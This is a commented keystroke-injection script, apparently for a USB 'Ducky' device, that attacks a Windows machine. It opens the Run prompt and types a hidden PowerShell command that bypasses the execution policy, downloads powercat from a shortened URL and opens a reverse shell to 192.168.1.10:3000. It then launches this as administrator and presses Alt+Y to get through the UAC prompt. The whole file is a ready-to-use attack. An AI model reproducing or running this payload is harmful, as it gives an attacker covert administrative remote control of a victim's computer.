# This first delay stalls the Ducky for 5.5 seconds to give the target
# operating system some time to mount the USB as a keyboard device.
sleep 5500

# Opens the Windows Run prompt.
gui "r"

# Delays .7 seconds to give the Run prompt time to open.
sleep 700

# Types the PowerShell payload.
echo "powershell /w Hidden /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.1.10 -p 3000 -e powershell"

# Presses Ctrl + Shirt + Enter to execute the PowerShell with administrative privileges.
ctrl shift enter

# Delay .85 seconds to give the UAC prompt time to open.
sleep 850

# ALT + Y to bypass UAC.
alt "y"